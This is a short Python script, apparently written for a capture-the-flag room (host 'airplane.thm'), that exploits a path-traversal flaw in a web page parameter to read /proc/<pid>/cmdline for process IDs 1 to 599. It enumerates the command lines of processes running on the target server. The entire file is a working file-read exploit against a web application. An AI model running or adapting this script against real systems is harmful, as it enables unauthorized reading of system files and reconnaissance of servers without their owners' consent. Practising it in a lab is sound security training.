import aiohttp
import asyncio

async def fetch_url(session, x):
    url = f"http://airplane.thm:8000/?page=/../../../../../../../../../../../../../proc/{x}/cmdline"
    async with session.get(url) as response:
        return await response.text()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_url(session, x) for x in range(1, 600)]
        results = await asyncio.gather(*tasks)

    for x, result in enumerate(results, start=1):
        print(f"Process ID {x}: {result}")

if __name__ == "__main__":
    asyncio.run(main())
